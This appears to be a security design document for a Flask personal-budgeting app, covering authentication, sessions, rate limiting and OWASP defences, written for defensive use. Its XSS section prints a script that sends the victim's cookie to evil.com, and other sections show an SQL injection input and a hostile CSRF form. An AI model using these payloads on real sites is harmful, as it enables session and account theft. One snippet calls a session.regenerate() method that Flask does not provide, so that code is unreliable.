# SwiftBudget - Security & Authentication Document

**Version:** 1.0  
**Date:** February 20, 2026  
**Project:** SwiftBudget - Personal & Household Budgeting Web Application  
**Security Level:** High (Financial Data)  
**Compliance:** GDPR-Ready, OWASP Top 10

---

## 1. Security Overview

### 1.1 Security Philosophy

SwiftBudget handles **sensitive financial data** and must implement defense-in-depth security:

- **Confidentiality**: User data encrypted in transit and at rest
- **Integrity**: Transactions cannot be tampered with
- **Availability**: 99.5% uptime with DDoS protection
- **Authentication**: Strong password policies and session management
- **Authorization**: Users can only access their own data

### 1.2 Threat Model

**Assets to Protect:**
1. User credentials (passwords, emails)
2. Financial transactions (amounts, descriptions, dates)
3. Personal information (usernames, email addresses)
4. Session tokens

**Threat Actors:**
- **External Attackers**: SQL injection, XSS, brute force
- **Malicious Users**: Unauthorized data access, privilege escalation
- **Insider Threats**: (Not applicable for personal app)

**Attack Vectors:**
- Web application vulnerabilities (OWASP Top 10)
- Weak passwords
- Session hijacking
- Man-in-the-middle attacks
- Database breaches

---

## 2. Authentication System

### 2.1 Password Security

#### **Password Requirements**

| Requirement | Rule | Enforcement |
|-------------|------|-------------|
| **Minimum Length** | 8 characters | Flask-WTF validator |
| **Complexity** | 1 uppercase, 1 lowercase, 1 number | Regex validation |
| **Special Characters** | Recommended (not required for UX) | Optional |
| **Common Passwords** | Blocked (e.g., "password123") | Custom validator |
| **Maximum Length** | 128 characters | Prevent DoS attacks |

**Implementation:**
```python
# app/forms.py
from wtforms.validators import ValidationError
import re

class RegistrationForm(FlaskForm):
    password = PasswordField('Password', validators=[
        DataRequired(),
        Length(min=8, max=128, message='Password must be 8-128 characters'),
        validate_password_strength
    ])
    
def validate_password_strength(form, field):
    password = field.data
    
    # Check for uppercase
    if not re.search(r'[A-Z]', password):
        raise ValidationError('Password must contain at least one uppercase letter')
    
    # Check for lowercase
    if not re.search(r'[a-z]', password):
        raise ValidationError('Password must contain at least one lowercase letter')
    
    # Check for digit
    if not re.search(r'\d', password):
        raise ValidationError('Password must contain at least one number')
    
    # Check against common passwords
    common_passwords = ['password', '12345678', 'qwerty', 'abc123']
    if password.lower() in common_passwords:
        raise ValidationError('Password is too common. Please choose a stronger password')
```

#### **Password Hashing (Bcrypt)**

**Algorithm:** Bcrypt with cost factor 12

**Why Bcrypt?**
- Adaptive: Cost factor increases over time as hardware improves
- Salt: Automatic random salt per password (prevents rainbow tables)
- Slow: Intentionally slow to prevent brute force (2^12 = 4096 iterations)

**Implementation:**
```python
# app/models/user.py
from flask_bcrypt import Bcrypt

bcrypt = Bcrypt()

class User(db.Model):
    password_hash = db.Column(db.String(255), nullable=False)
    
    def set_password(self, password):
        """Hash password with bcrypt (cost factor 12)"""
        self.password_hash = bcrypt.generate_password_hash(password).decode('utf-8')
    
    def check_password(self, password):
        """Verify password against hash"""
        return bcrypt.check_password_hash(self.password_hash, password)
```

**Example Hash:**
```
Input: "SecurePass123"
Output: $2b$12$KIXxLhashed...  (60 characters)
        ││  ││  └─ Hash (31 chars)
        ││  └─ Salt (22 chars)
        │└─ Cost factor (12 = 2^12 iterations)
        └─ Algorithm version (2b)
```

**Performance:**
- Hashing time: ~200ms (intentionally slow)
- Verification time: ~200ms
- Cost factor 12 = 4096 iterations (secure until ~2030)

#### **Password Reset Flow**

**Scenario:** User forgets password

**Flow:**
```
1. User clicks "Forgot Password"
2. User enters email address
3. System generates secure token (32 bytes, URL-safe)
4. System sends email with reset link (expires in 1 hour)
5. User clicks link: /reset-password/<token>
6. System verifies token (not expired, valid)
7. User enters new password
8. System hashes new password, invalidates token
9. User redirected to login
```

**Implementation:**
```python
# app/services/auth_service.py
from itsdangerous import URLSafeTimedSerializer

class AuthService:
    @staticmethod
    def generate_reset_token(user_email):
        """Generate password reset token (expires in 1 hour)"""
        serializer = URLSafeTimedSerializer(app.config['SECRET_KEY'])
        return serializer.dumps(user_email, salt='password-reset-salt')
    
    @staticmethod
    def verify_reset_token(token, max_age=3600):
        """Verify token and return email (max_age in seconds)"""
        serializer = URLSafeTimedSerializer(app.config['SECRET_KEY'])
        try:
            email = serializer.loads(token, salt='password-reset-salt', max_age=max_age)
            return email
        except:
            return None  # Token invalid or expired
```

**Security Considerations:**
- ✅ Token expires after 1 hour
- ✅ Token invalidated after use (one-time use)
- ✅ Token cryptographically signed (cannot be forged)
- ✅ No user enumeration (same message for valid/invalid emails)

---

### 2.2 Session Management

#### **Session Configuration**

**Technology:** Flask-Login + Secure Cookies

**Settings:**
```python
# config.py
from datetime import timedelta

# Session configuration
SESSION_COOKIE_SECURE = True       # HTTPS only
SESSION_COOKIE_HTTPONLY = True     # No JavaScript access
SESSION_COOKIE_SAMESITE = 'Lax'    # CSRF protection
PERMANENT_SESSION_LIFETIME = timedelta(hours=24)  # 24-hour sessions
REMEMBER_COOKIE_DURATION = timedelta(days=30)     # "Remember Me" duration
REMEMBER_COOKIE_SECURE = True
REMEMBER_COOKIE_HTTPONLY = True
```

**Cookie Attributes Explained:**

| Attribute | Value | Purpose |
|-----------|-------|---------|
| `Secure` | True | Only sent over HTTPS (prevents MITM) |
| `HttpOnly` | True | Not accessible via JavaScript (prevents XSS) |
| `SameSite` | Lax | Prevents CSRF attacks (cookies not sent on cross-site requests) |
| `Max-Age` | 86400 | Session expires after 24 hours |

**Example Cookie:**
```http
Set-Cookie: session=abc123...; Secure; HttpOnly; SameSite=Lax; Max-Age=86400; Path=/
```

#### **Login Flow**

```python
# app/routes/auth.py
from flask_login import login_user, current_user

@auth_bp.route('/login', methods=['POST'])
def login():
    form = LoginForm()
    
    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data).first()
        
        if user and user.check_password(form.password.data):
            # Create session
            login_user(user, remember=form.remember_me.data)
            
            # Log successful login
            logger.info(f"User {user.username} logged in from {request.remote_addr}")
            
            # Redirect to intended page or dashboard
            next_page = request.args.get('next')
            if next_page and is_safe_url(next_page):
                return redirect(next_page)
            return redirect(url_for('dashboard.index'))
        else:
            # Generic error message (no user enumeration)
            flash('Invalid username or password', 'error')
            
            # Log failed attempt
            logger.warning(f"Failed login attempt for {form.username.data} from {request.remote_addr}")
    
    return render_template('auth/login.html', form=form)
```

#### **Session Fixation Prevention**

**Attack:** Attacker sets victim's session ID, then hijacks after login

**Prevention:**
```python
from flask import session

@auth_bp.route('/login', methods=['POST'])
def login():
    # ... authentication logic ...
    
    if user_authenticated:
        # Regenerate session ID after login (prevents fixation)
        session.regenerate()
        login_user(user)
```

#### **Session Timeout**

**Idle Timeout:** 24 hours (configurable)

**Implementation:**
```python
# app/__init__.py
from flask_login import LoginManager

login_manager = LoginManager()
login_manager.session_protection = 'strong'  # Detect session tampering

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

@login_manager.unauthorized_handler
def unauthorized():
    flash('Please log in to access this page', 'warning')
    return redirect(url_for('auth.login'))
```

---

### 2.3 Brute Force Protection

#### **Rate Limiting**

**Tool:** Flask-Limiter

**Configuration:**
```python
# app/__init__.py
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="memory://"  # Use Redis in production
)

# Apply to login route
@auth_bp.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # Max 5 login attempts per minute
def login():
    # ... login logic ...
```

**Rate Limits:**

| Endpoint | Limit | Reason |
|----------|-------|--------|
| `/login` | 5 per minute | Prevent brute force |
| `/signup` | 3 per hour | Prevent spam accounts |
| `/reset-password` | 3 per hour | Prevent email flooding |
| `/api/*` | 100 per hour | General API protection |

**Response (Rate Limit Exceeded):**
```http
HTTP/1.1 429 Too Many Requests
Retry-After: 60

Flash Message: "Too many login attempts. Please try again in 1 minute."
```

#### **Account Lockout (Future Enhancement)**

**Strategy:** Lock account after 5 failed login attempts

**Implementation:**
```python
# app/models/user.py
class User(db.Model):
    failed_login_attempts = db.Column(db.Integer, default=0)
    locked_until = db.Column(db.DateTime, nullable=True)
    
    def is_locked(self):
        if self.locked_until and self.locked_until > datetime.utcnow():
            return True
        return False
    
    def increment_failed_attempts(self):
        self.failed_login_attempts += 1
        if self.failed_login_attempts >= 5:
            # Lock for 15 minutes
            self.locked_until = datetime.utcnow() + timedelta(minutes=15)
        db.session.commit()
    
    def reset_failed_attempts(self):
        self.failed_login_attempts = 0
        self.locked_until = None
        db.session.commit()
```

---

## 3. Authorization & Access Control

### 3.1 Role-Based Access Control (RBAC)

**Current:** All users have equal permissions (own data only)

**Future:** Admin role for managing default categories

**Implementation:**
```python
# app/models/user.py
class User(db.Model):
    role = db.Column(db.String(20), default='user')  # 'user' or 'admin'
    
    def is_admin(self):
        return self.role == 'admin'

# app/decorators.py
from functools import wraps
from flask import abort
from flask_login import current_user

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not current_user.is_authenticated or not current_user.is_admin():
            abort(403)  # Forbidden
        return f(*args, **kwargs)
    return decorated_function

# Usage
@app.route('/admin/users')
@login_required
@admin_required
def admin_users():
    # Only admins can access
    pass
```

### 3.2 Data Isolation

**Principle:** Users can only access their own data

**Enforcement:**
```python
# WRONG: No authorization check
@app.route('/transactions/<int:id>')
@login_required
def view_transaction(id):
    transaction = Transaction.query.get_or_404(id)
    return render_template('transaction.html', transaction=transaction)

# CORRECT: Verify ownership
@app.route('/transactions/<int:id>')
@login_required
def view_transaction(id):
    transaction = Transaction.query.get_or_404(id)
    
    # Authorization check
    if transaction.user_id != current_user.id:
        abort(403)  # Forbidden
    
    return render_template('transaction.html', transaction=transaction)
```

**Service Layer Pattern:**
```python
# app/services/transaction_service.py
class TransactionService:
    @staticmethod
    def get_transaction(transaction_id, user_id):
        """Get transaction only if it belongs to user"""
        transaction = Transaction.query.filter_by(
            id=transaction_id,
            user_id=user_id
        ).first()
        
        if not transaction:
            raise PermissionError("Transaction not found or access denied")
        
        return transaction
```

---

## 4. Web Application Security (OWASP Top 10)

### 4.1 SQL Injection Prevention

**Vulnerability:** Malicious SQL in user input

**Example Attack:**
```python
# VULNERABLE CODE (DO NOT USE)
username = request.form['username']
query = f"SELECT * FROM users WHERE username = '{username}'"
db.execute(query)

# Attack input: admin' OR '1'='1
# Resulting query: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
# Result: Returns all users!
```

**Prevention:** Use SQLAlchemy ORM (parameterized queries)

```python
# SAFE CODE
username = request.form['username']
user = User.query.filter_by(username=username).first()

# SQLAlchemy generates: SELECT * FROM users WHERE username = ?
# Parameter: 'admin\' OR \'1\'=\'1'  (escaped)
```

**Rule:** NEVER use raw SQL with user input. Always use ORM.

---

### 4.2 Cross-Site Scripting (XSS) Prevention

**Vulnerability:** Malicious JavaScript in user input

**Example Attack:**
```html
<!-- User enters as transaction description: -->
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>

<!-- Without escaping, this renders as: -->
<p>Description: <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script></p>
```

**Prevention:** Jinja2 auto-escaping (enabled by default)

```html
<!-- SAFE: Jinja2 auto-escapes -->
<p>Description: {{ transaction.description }}</p>

<!-- Renders as: -->
<p>Description: &lt;script&gt;fetch(...)&lt;/script&gt;</p>
```

**Manual Escaping (if needed):**
```python
from markupsafe import escape

safe_description = escape(user_input)
```

**Content Security Policy (CSP):**
```python
# app/__init__.py
from flask_talisman import Talisman

Talisman(app, content_security_policy={
    'default-src': "'self'",
    'script-src': ["'self'", 'cdn.jsdelivr.net'],
    'style-src': ["'self'", 'cdn.jsdelivr.net'],
    'img-src': ["'self'", 'data:'],
    'font-src': ["'self'", 'cdn.jsdelivr.net']
})
```

---

### 4.3 Cross-Site Request Forgery (CSRF) Prevention

**Vulnerability:** Attacker tricks user into submitting malicious request

**Example Attack:**
```html
<!-- Attacker's website: evil.com -->
<form action="https://swiftbudget.com/transactions/delete/123" method="POST">
  <input type="submit" value="Click for free money!">
</form>

<!-- If user is logged in and clicks, transaction 123 is deleted -->
```

**Prevention:** Flask-WTF CSRF tokens

```html
<!-- All forms include CSRF token -->
<form method="POST" action="/transactions/add">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
  <!-- Other fields -->
  <button type="submit">Add Transaction</button>
</form>
```

**Server-Side Validation:**
```python
# app/routes/transactions.py
from flask_wtf.csrf import validate_csrf

@transactions_bp.route('/add', methods=['POST'])
@login_required
def add_transaction():
    form = TransactionForm()
    
    # Flask-WTF automatically validates CSRF token
    if form.validate_on_submit():
        # Process form
        pass
    else:
        # CSRF validation failed
        flash('Invalid form submission', 'error')
```

**AJAX Requests:**
```javascript
// Include CSRF token in AJAX headers
fetch('/api/transactions', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRFToken': document.querySelector('meta[name="csrf-token"]').content
  },
  body: JSON.stringify(data)
});
```

---

### 4.4 Insecure Direct Object References (IDOR)

**Vulnerability:** Accessing resources by guessing IDs

**Example Attack:**
```
User A's transaction: /transactions/123
User B tries: /transactions/124, /transactions/125, ...
```

**Prevention:** Always verify ownership

```python
@transactions_bp.route('/edit/<int:id>')
@login_required
def edit_transaction(id):
    transaction = Transaction.query.get_or_404(id)
    
    # CRITICAL: Verify ownership
    if transaction.user_id != current_user.id:
        abort(403)
    
    return render_template('edit.html', transaction=transaction)
```

**Alternative:** Use UUIDs instead of sequential IDs

```python
# app/models/transaction.py
import uuid

class Transaction(db.Model):
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    
# URL becomes: /transactions/a1b2c3d4-e5f6-7890-abcd-ef1234567890
# Much harder to guess!
```

---

### 4.5 Security Misconfiguration

**Checklist:**

- [x] `DEBUG = False` in production
- [x] Remove default credentials
- [x] Disable directory listing
- [x] Remove unnecessary endpoints
- [x] Keep dependencies updated
- [x] Use environment variables for secrets
- [x] Enable security headers

**Security Headers:**
```python
# app/__init__.py
@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    return response
```

---

### 4.6 Sensitive Data Exposure

**Data Classification:**

| Data Type | Sensitivity | Protection |
|-----------|-------------|------------|
| **Passwords** | Critical | Bcrypt hashing, never logged |
| **Email Addresses** | High | Encrypted in transit (HTTPS) |
| **Transaction Amounts** | High | Encrypted in transit, access control |
| **Usernames** | Medium | Public within app |
| **Session Tokens** | Critical | HttpOnly cookies, HTTPS only |

**Logging Best Practices:**
```python
# WRONG: Logging sensitive data
logger.info(f"User {username} logged in with password {password}")

# CORRECT: Log only non-sensitive data
logger.info(f"User {username} logged in from {request.remote_addr}")
```

**Error Messages:**
```python
# WRONG: Exposing internal details
except Exception as e:
    return f"Database error: {str(e)}", 500

# CORRECT: Generic error message
except Exception as e:
    logger.error(f"Database error: {str(e)}")  # Log for debugging
    return "An error occurred. Please try again later.", 500
```

---

### 4.7 Missing Function Level Access Control

**Vulnerability:** Users accessing admin functions

**Prevention:**
```python
# app/routes/admin.py
from app.decorators import admin_required

@admin_bp.route('/users')
@login_required
@admin_required  # Double-check authorization
def list_users():
    users = User.query.all()
    return render_template('admin/users.html', users=users)
```

---

### 4.8 Using Components with Known Vulnerabilities

**Strategy:** Keep dependencies updated

**Tools:**
```bash
# Check for vulnerabilities
pip install safety
safety check

# Update dependencies
pip list --outdated
pip install --upgrade flask sqlalchemy
```

**Automated Scanning:**
- GitHub Dependabot (automatic PRs for security updates)
- Snyk (continuous vulnerability monitoring)

---

### 4.9 Insufficient Logging & Monitoring

**What to Log:**

| Event | Log Level | Example |
|-------|-----------|---------|
| User login | INFO | `User john_doe logged in from 192.168.1.1` |
| Failed login | WARNING | `Failed login for john_doe from 192.168.1.1` |
| Transaction created | INFO | `Transaction created: $45.50 (user_id=1)` |
| Authorization failure | WARNING | `User 1 attempted to access transaction 999 (forbidden)` |
| Application error | ERROR | `Database connection failed: timeout` |
| Security event | CRITICAL | `5 failed logins for john_doe in 1 minute` |

**Implementation:**
```python
# app/__init__.py
import logging
from logging.handlers import RotatingFileHandler

if not app.debug:
    file_handler = RotatingFileHandler('logs/swiftbudget.log', maxBytes=10240, backupCount=10)
    file_handler.setFormatter(logging.Formatter(
        '%(asctime)s %(levelname)s: %(message)s [in %(pathname)s:%(lineno)d]'
    ))
    file_handler.setLevel(logging.INFO)
    app.logger.addHandler(file_handler)
    app.logger.setLevel(logging.INFO)
```

**Security Monitoring:**
```python
# app/services/security_monitor.py
class SecurityMonitor:
    @staticmethod
    def log_failed_login(username, ip_address):
        logger.warning(f"Failed login: {username} from {ip_address}")
        
        # Check for brute force (5 failures in 5 minutes)
        recent_failures = FailedLogin.query.filter(
            FailedLogin.username == username,
            FailedLogin.timestamp > datetime.utcnow() - timedelta(minutes=5)
        ).count()
        
        if recent_failures >= 5:
            logger.critical(f"BRUTE FORCE DETECTED: {username} from {ip_address}")
            # Send alert email to admin
```

---

## 5. Data Encryption

### 5.1 Encryption in Transit (HTTPS/TLS)

**Protocol:** TLS 1.3 (enforced by Render.com)

**Certificate:** Let's Encrypt (auto-renewed)

**Configuration:**
```python
# app/__init__.py
from flask_talisman import Talisman

if not app.debug:
    Talisman(app,
        force_https=True,
        strict_transport_security=True,
        strict_transport_security_max_age=31536000
    )
```

**HSTS Header:**
```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

### 5.2 Encryption at Rest

**Database:** AES-256 encryption (Supabase default)

**Backups:** Encrypted with AES-256

**Application-Level Encryption (Future):**
```python
# For highly sensitive data (e.g., SSN, credit cards)
from cryptography.fernet import Fernet

class EncryptionService:
    def __init__(self):
        self.key = os.getenv('ENCRYPTION_KEY')  # 32-byte key
        self.cipher = Fernet(self.key)
    
    def encrypt(self, plaintext):
        return self.cipher.encrypt(plaintext.encode()).decode()
    
    def decrypt(self, ciphertext):
        return self.cipher.decrypt(ciphertext.encode()).decode()
```

---

## 6. Privacy & Compliance

### 6.1 GDPR Compliance

**User Rights:**

| Right | Implementation |
|-------|----------------|
| **Right to Access** | `/settings/export-data` endpoint (download all user data as JSON) |
| **Right to Erasure** | `/settings/delete-account` endpoint (hard delete all user data) |
| **Right to Portability** | Export transactions as CSV/JSON |
| **Right to Rectification** | Users can edit all their data |

**Data Retention:**
- Active data: Indefinite (until user deletes)
- Deleted transactions: 90 days (soft delete recovery window)
- Logs: 1 year

**Privacy Policy:**
```
We collect:
- Email address (for login and notifications)
- Transaction data (amounts, descriptions, dates)
- Usage logs (IP addresses, login times)

We do NOT:
- Sell your data to third parties
- Use your data for advertising
- Share your data without consent
```

### 6.2 Data Minimization

**Principle:** Collect only necessary data

**What We Collect:**
- ✅ Username, email, password (authentication)
- ✅ Transactions (core functionality)
- ✅ Budget goals (core functionality)

**What We DON'T Collect:**
- ❌ Phone numbers (not needed)
- ❌ Physical addresses (not needed)
- ❌ Social security numbers (not needed)
- ❌ Payment information (no payments processed)

---

## 7. Security Testing

### 7.1 Automated Security Scans

**Tools:**

| Tool | Purpose | Frequency |
|------|---------|-----------|
| **Bandit** | Python code security scanner | Every commit |
| **Safety** | Dependency vulnerability checker | Weekly |
| **OWASP ZAP** | Web application scanner | Monthly |
| **SQLMap** | SQL injection testing | Pre-release |

**Example:**
```bash
# Run Bandit
pip install bandit
bandit -r app/

# Run Safety
pip install safety
safety check

# Run OWASP ZAP (Docker)
docker run -t owasp/zap2docker-stable zap-baseline.py -t https://swiftbudget.onrender.com
```

### 7.2 Manual Penetration Testing

**Checklist:**

- [ ] SQL injection (all input fields)
- [ ] XSS (transaction descriptions, usernames)
- [ ] CSRF (all POST/PUT/DELETE requests)
- [ ] IDOR (accessing other users' transactions)
- [ ] Session fixation
- [ ] Brute force login
- [ ] Password reset token expiration
- [ ] Authorization bypass

---

## 8. Incident Response Plan

### 8.1 Security Incident Types

| Type | Severity | Response Time |
|------|----------|---------------|
| **Data Breach** | Critical | Immediate |
| **XSS Vulnerability** | High | 24 hours |
| **Brute Force Attack** | Medium | 48 hours |
| **Dependency Vulnerability** | Low-High | 7 days |

### 8.2 Incident Response Steps

**1. Detection**
- Monitor logs for suspicious activity
- GitHub security alerts
- User reports

**2. Containment**
- Disable affected endpoint
- Revoke compromised sessions
- Block malicious IPs

**3. Investigation**
- Review logs
- Identify attack vector
- Assess damage

**4. Remediation**
- Patch vulnerability
- Deploy fix
- Verify fix

**5. Recovery**
- Restore from backup (if needed)
- Reset affected user passwords
- Monitor for recurrence

**6. Post-Incident**
- Document incident
- Update security procedures
- Notify affected users (if required by GDPR)

---

## 9. Security Checklist

### 9.1 Pre-Deployment

- [ ] All passwords hashed with bcrypt
- [ ] CSRF protection enabled on all forms
- [ ] SQL injection prevention (ORM only)
- [ ] XSS prevention (Jinja2 auto-escaping)
- [ ] HTTPS enforced
- [ ] Security headers configured
- [ ] Rate limiting enabled
- [ ] Logging configured
- [ ] Environment variables (no hardcoded secrets)
- [ ] Dependencies updated

### 9.2 Post-Deployment

- [ ] SSL certificate valid
- [ ] Security headers present (check with securityheaders.com)
- [ ] OWASP ZAP scan passed
- [ ] Penetration testing completed
- [ ] Monitoring configured
- [ ] Backup system tested
- [ ] Incident response plan documented

---

## 10. Approval & Revision History

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2026-02-20 | Developer | Initial security documentation |

**Next Document:** Testing Strategy Document
